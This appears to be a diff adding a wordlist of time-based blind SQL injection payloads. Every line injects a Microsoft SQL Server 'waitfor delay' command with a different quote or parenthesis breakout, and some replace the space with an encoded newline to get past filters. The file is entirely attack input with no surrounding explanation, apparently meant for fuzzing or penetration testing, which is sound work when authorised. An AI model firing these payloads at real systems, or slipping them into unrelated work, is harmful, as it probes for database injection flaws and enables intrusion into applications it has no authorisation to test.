@@ -1,0 +1,12 @@
+;waitfor delay '0:0:5'--
+;waitfor%0adelay '0:0:5'--
+';waitfor%0adelay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+');waitfor%0adelay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
